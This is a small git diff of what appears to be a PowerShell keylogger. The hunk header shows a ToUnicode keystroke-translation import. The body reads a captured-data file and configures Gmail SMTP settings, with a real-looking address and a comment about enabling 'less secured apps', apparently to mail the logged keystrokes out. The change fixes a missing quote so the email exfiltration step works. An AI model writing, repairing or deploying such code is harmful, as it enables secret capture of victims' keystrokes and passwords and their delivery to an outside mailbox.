@@ -75,7 +75,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     # please specify your email info and don't forgot to enable less secured apps in gmail
 
     $data = Get-Content "$Path" 
-    $emailto = chithra1622002@gmail.com'
+    $emailto = 'chithra1622002@gmail.com'
     $email = 'chithra1622002@gmail.com'
     $SMTPServer = 'smtp.gmail.com'
     $SMTPPort = '587'
